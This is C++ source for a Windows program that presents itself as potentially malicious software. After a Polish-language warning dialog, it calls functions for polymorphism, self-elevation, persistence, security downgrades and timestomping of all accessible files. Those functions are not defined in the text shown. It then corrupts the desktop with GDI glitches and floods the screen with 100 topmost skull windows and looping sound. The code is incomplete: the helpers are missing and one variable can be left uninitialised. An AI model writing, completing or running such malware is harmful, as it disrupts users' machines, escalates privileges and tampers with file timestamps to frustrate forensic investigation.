#include <windows.h>
#include <iostream>
#include <vector>
#include <ctime>
#include <mmsystem.h>

#pragma comment(lib, "winmm.lib")

const char* skullFrame0 = R"(
        ______
     .-"      "-.
    /            \
   |              |
   |,  .-.  .-.  ,|
   | )(__/  \__)( |
   |/     /\     \|
   (_     ^^     _)
    \__|IIIIII|__/
     | \IIIIII/ |
     \          /
      `--------`
)";

const char* skullFrame1 = R"(
        ______
     .-"      "-.
    /            \
   |              |
   |,  .-.  .-.  ,|
   | )(__/  \__)( |
   |/     /\     \|
   (_     ^^     _)
    \__|IIIIII|__/

      | IIIIII |
      | \    / |
       `------`
)";

const char* frames[] = { skullFrame0, skullFrame1 };

LRESULT CALLBACK SkullWindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            
            RECT rect;
            GetClientRect(hwnd, &rect);
            HBRUSH brush = CreateSolidBrush(RGB(0, 0, 0));
            FillRect(hdc, &rect, brush);
            DeleteObject(brush);

            SetBkMode(hdc, TRANSPARENT);
            
            COLORREF colors[] = { RGB(255,0,0), RGB(0,255,0), RGB(255,0,255), RGB(255,255,0) };
            SetTextColor(hdc, colors[rand() % 4]); 
            
            HFONT hFont = CreateFontA(16, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, 
                                      DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, 
                                      CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, 
                                      FIXED_PITCH, "Consolas");
            SelectObject(hdc, hFont);

            int currentFrame = (GetTickCount64() / 150) % 2;

            DrawTextA(hdc, frames[currentFrame], -1, &rect, DT_CENTER | DT_VCENTER);
            
            DeleteObject(hFont);
            EndPaint(hwnd, &ps);
            return 0;
        }
        case WM_ERASEBKGND: return 1;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

void ShowSkull() {
    const char* CLASS_NAME = "SkullWindowClass";
    WNDCLASS wc = { };
    wc.lpfnWndProc   = SkullWindowProc;
    wc.hInstance     = GetModuleHandle(NULL);
    wc.lpszClassName = CLASS_NAME;
    wc.hCursor       = LoadCursor(NULL, IDC_CROSS);
    RegisterClass(&wc);

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    const int NUM_WINDOWS = 100;
    std::vector<HWND> skullWindows;
    
    for (int i = 0; i < NUM_WINDOWS; i++) {
        HWND hwnd = CreateWindowExA(
            WS_EX_TOPMOST, CLASS_NAME, "", 
            WS_POPUP | WS_BORDER, 
            0, 0, 250, 240, NULL, NULL, GetModuleHandle(NULL), NULL
        );
        skullWindows.push_back(hwnd);
    }

    PlaySoundA(MAKEINTRESOURCE(101), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC | SND_LOOP);
    
    srand((unsigned int)time(NULL));
    ULONGLONG start_time = GetTickCount64();

    while (GetTickCount64() - start_time < 5500) { 
        HDC desktopDC = GetDC(NULL); 
        int glitchX = rand() % screenW;
        int glitchY = rand() % screenH;
        int glitchW = rand() % 800;
        int glitchH = rand() % 300;

        int glitchType = rand() % 6; 

        if (glitchType == 0) {
            BitBlt(desktopDC, glitchX, glitchY, glitchW, glitchH, desktopDC, glitchX, glitchY, NOTSRCCOPY);
        } 
        else if (glitchType == 1) {
            HBRUSH randomBrush = CreateSolidBrush(RGB(rand()%255, rand()%255, rand()%255));
            HGDIOBJ oldBrush = SelectObject(desktopDC, randomBrush);
            PatBlt(desktopDC, glitchX, glitchY, glitchW, glitchH, PATINVERT);
            SelectObject(desktopDC, oldBrush);
            DeleteObject(randomBrush);
        } 
        else if (glitchType == 2  || glitchType == 4 || glitchType == 5) {
            int shiftX = (rand() % 150) - 75; 
            BitBlt(desktopDC, glitchX + shiftX, glitchY, glitchW, glitchH, desktopDC, glitchX, glitchY, SRCCOPY);
        }
        else if (glitchType == 3) {
            HDC memDC = CreateCompatibleDC(desktopDC);
            HBITMAP hBitmap = CreateCompatibleBitmap(desktopDC, glitchW, glitchH);
            HGDIOBJ oldBmp = SelectObject(memDC, hBitmap);
            BitBlt(memDC, 0, 0, glitchW, glitchH, desktopDC, glitchX, glitchY, SRCCOPY);

            for (int i = 0; i < 10; i++) {
                int shakeX = (rand() % 80) - 40; 
                int shakeY = (rand() % 80) - 40; 

                BitBlt(desktopDC, glitchX + shakeX, glitchY + shakeY, glitchW, glitchH, memDC, 0, 0, SRCCOPY);
                
                HBRUSH shakeBrush = CreateSolidBrush(RGB(rand()%255, rand()%255, rand()%255));
                HGDIOBJ oldShakeBrush = SelectObject(desktopDC, shakeBrush);
                PatBlt(desktopDC, glitchX + shakeX, glitchY + shakeY, glitchW, glitchH, PATINVERT);
                
                SelectObject(desktopDC, oldShakeBrush);
                DeleteObject(shakeBrush);

                MSG msg;
                while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }
                Sleep(15); 
            }

            SelectObject(memDC, oldBmp);
            DeleteObject(hBitmap);
            DeleteDC(memDC);
        }

        ReleaseDC(NULL, desktopDC); 

        HWND randomHwnd = skullWindows[rand() % NUM_WINDOWS];
        
        if (rand() % 2 == 0) {
            int winX = rand() % (screenW - 250);
            int winY = rand() % (screenH - 240);
            SetWindowPos(randomHwnd, HWND_TOPMOST, winX, winY, 0, 0, SWP_NOSIZE | SWP_SHOWWINDOW);
            RedrawWindow(randomHwnd, NULL, NULL, RDW_INVALIDATE | RDW_UPDATENOW); 
        } else {
            ShowWindow(randomHwnd, SW_HIDE);
        }

        MSG msg;
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Sleep(5); 
    }

    PlaySoundA(MAKEINTRESOURCE(102), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC | SND_LOOP);
    
    ULONGLONG finale_start = GetTickCount64();
    
    while (GetTickCount64() - finale_start < 3500) {
        for (HWND hwnd : skullWindows) {
            if (IsWindowVisible(hwnd)) {
                RedrawWindow(hwnd, NULL, NULL, RDW_INVALIDATE | RDW_UPDATENOW);
            }
        }

        MSG msg;
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Sleep(30); 
    }

    PlaySoundA(NULL, 0, 0); 

    for (HWND hwnd : skullWindows) {
        DestroyWindow(hwnd);
    }
    UnregisterClassA(CLASS_NAME, GetModuleHandle(NULL));

    RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ALLCHILDREN | RDW_ERASE | RDW_UPDATENOW);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{
    int result = MessageBoxA(
        NULL,
        "Za chwilę zostanie uruchomione oprogramowanie, które może zostać uznane za potencjalnie złośliwe.\n\n"
        "Uruchamiaj je wyłącznie, jeśli rozumiesz związane z tym ryzyko.\n\n"
        "Czy chcesz kontynuować?",
        "Ostrzeżenie",
        MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2
    );

    if (result != IDYES)
    {
        return 0;
    }

    MakePolymorphic();
    bool is_elevated;
    if (!IsElevated()) {
        if (ElevateSelf()) {
            is_elevated = 1;
        } else {
            ApplyDowngradeUserOnly();
            is_elevated = 0;
        }
    }
    PersistenceSimulation();
    ApplyDowngradeFull(); 
    TimestompAllAccessibleFiles(is_elevated);

    if (1)
    {
        ShowSkull();
    }
    return 0;
}